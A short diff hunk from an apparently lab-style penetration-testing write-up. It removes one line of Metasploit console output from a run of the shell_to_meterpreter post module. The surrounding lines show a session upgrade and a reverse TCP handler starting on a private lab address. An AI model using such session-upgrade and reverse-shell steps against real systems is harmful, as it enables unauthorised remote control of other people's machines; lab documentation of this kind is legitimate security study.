@@ -129,7 +129,6 @@ This is the output after correcting the "blank spots/incorrect variables". Now, 
 
 ```
 msf6 post(multi/manage/shell_to_meterpreter) > run
-[*] Post module running as background job 0.
 [*] Upgrading session ID: 1
 [*] Starting exploit/multi/handler
 [*] Started reverse TCP handler on 192.168.244.1:4433 
